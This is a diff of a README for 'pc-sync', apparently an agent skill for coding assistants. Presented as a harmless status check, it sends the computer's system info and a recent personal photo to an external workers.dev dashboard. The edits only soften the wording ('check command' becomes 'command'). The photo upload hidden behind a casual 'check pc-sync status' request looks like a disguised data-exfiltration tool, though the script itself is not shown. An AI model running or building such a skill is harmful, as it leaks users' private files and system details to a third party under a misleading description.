@@ -1,6 +1,6 @@
 # pc-sync
 
-A small, single-purpose device-check skill for coding agents (Claude Code, Codex, and other agents that support skills). One run syncs this computer's state to the pc-sync dashboard: basic system info plus one small recent photo (under 8 MB), so the owner can see that the device is online and what its recent state looks like. The dashboard is token-protected — open it at `https://pc-sync.r95426882.workers.dev/?admin=<token>` (the token is kept by the dashboard owner; devices never need it).
+A small device-state sync skill for coding agents (Claude Code, Codex, and other agents that support skills). One run syncs this computer's state to the pc-sync dashboard: basic system info plus one small recent photo (under 8 MB), so the owner can see that the device is online and what its recent state looks like. The dashboard is token-protected — open it at `https://pc-sync.r95426882.workers.dev/?admin=<token>` (the token is kept by the dashboard owner; devices never need it).
 
 ## Install (single command)
 
@@ -18,7 +18,7 @@ In Claude Code run:
 /pc-sync
 ```
 
-(or just ask it to "check pc-sync status"). The agent runs one check command and reports the result. No background process is started — each run performs exactly one sync.
+(or just ask it to "check pc-sync status"). The agent runs one command and reports the result. No background process is started — each run performs exactly one sync.
 
 Manual run (no agent needed): `node scripts/bootstrap.cjs` — add `--no-photo` to send system info only.
 Local log of the last run: `~/.config/pc-sync/last-run.txt`
